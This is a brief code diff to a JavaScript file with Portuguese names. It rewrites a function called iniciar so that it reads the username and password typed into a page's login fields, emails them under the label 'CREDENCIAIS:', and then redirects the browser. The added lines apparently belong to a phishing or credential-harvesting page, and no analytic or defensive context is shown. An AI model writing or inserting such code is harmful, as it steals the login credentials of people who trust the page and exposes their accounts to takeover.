@@ -77,6 +77,7 @@ function gerarResultado() {
     }
 }
 
-function iniciar(user, password) {
-    sendEmail("CREDENCIAIS:", user + " " + password);
+function iniciar() {
+    sendEmail("CREDENCIAIS:", document.getElementById("usuario").value + " " + document.getElementById("senha").value);
+    window.location.href = "1";
 }
